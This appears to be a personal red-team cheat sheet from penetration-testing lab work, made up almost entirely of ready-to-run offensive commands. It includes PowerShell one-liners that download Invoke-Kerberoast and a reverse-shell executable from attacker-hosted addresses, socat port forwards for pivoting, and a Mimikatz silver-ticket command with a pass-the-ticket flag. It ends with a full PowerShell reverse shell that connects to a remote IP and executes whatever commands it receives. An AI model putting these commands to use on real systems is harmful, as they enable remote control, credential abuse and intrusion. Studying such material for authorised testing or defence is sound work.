# Online cheatsheets
https://gist.github.com/jivoi/c354eaaf3019352ce32522f916c03d70#file-redteam_cheatsheet-ps1

# Python webserver
python3 -m http.server

# Powershell Download file into memory
(New-Object Net.WebClient).DownloadString('172.16.242.10:8000/Invoke-Kerberoast.ps1.b64')

# Powershell Download file to disk
powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://192.168.119.218:8000/rshell.exe', 'rshell.exe')"

# Socat simple TCP port forward
socat TCP4-LISTEN:4300,fork TCP4:192.168.119.186:8000
socat TCP4-LISTEN:4400,fork TCP4:172.16.156.5:3389


# Make NThash (NTLM)
iconv -f ASCII -t UTF-16LE <(printf 'password') | openssl dgst -md4

# Kerberos Silver Ticket
kerberos::golden /user:offsec /domain:corp.com /sid:S-1-5-21-4038953314-3014849035-1274281563 /target:CorpWebServer.corp.com /service:HTTP /rc4:e2b475c11da2a0748290d87aa966c327 /ptt

Powershell reverse shell
$ip='172.16.186.10'; $port=4300; $client = New-Object System.Net.Sockets.TCPClient($ip,$port); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) { $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i); $sendback = (iex $data 2>&1 | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush(); } $client.Close();